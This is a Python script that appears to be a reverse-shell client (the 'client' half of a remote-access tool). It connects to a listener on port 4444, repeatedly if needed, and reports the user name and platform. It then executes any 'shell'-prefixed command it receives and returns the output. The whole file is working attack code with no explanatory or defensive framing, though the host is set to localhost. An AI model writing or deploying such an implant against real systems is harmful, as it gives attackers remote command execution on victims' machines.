
import os
import socket
import platform
from time import sleep
import subprocess

host = '127.0.0.1'
port = 4444

client = socket.socket()

if __name__ == '__main__':
    systemv = os.getlogin() +'/'+ platform.platform()
    prompt = os.getcwd()
    if 'Linux' in systemv:
        prompt +='$'
    else:
        prompt +='>'
    text = prompt +'`'+systemv
    while True:
        try:
            client.connect((host, port))
            client.send(text.encode('gbk'))
            break
        except Exception:
            sleep(30)
    while True:
        cmd = client.recv(1024).decode('gbk')
        other = cmd.split(' ')
        first = other[0]
        if first == 'mantis':
            pass
        elif first == 'shell':
            if len(other) > 1:
                cmd =''
                for i in range(1,len(other)):
                    cmd += other[i] +' '
                print(cmd)
                res = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
                result, _ = res.communicate()
                client.send(result)
                client.send("``````````".encode('gbk'))
            else:
                client.send(b' ')
        

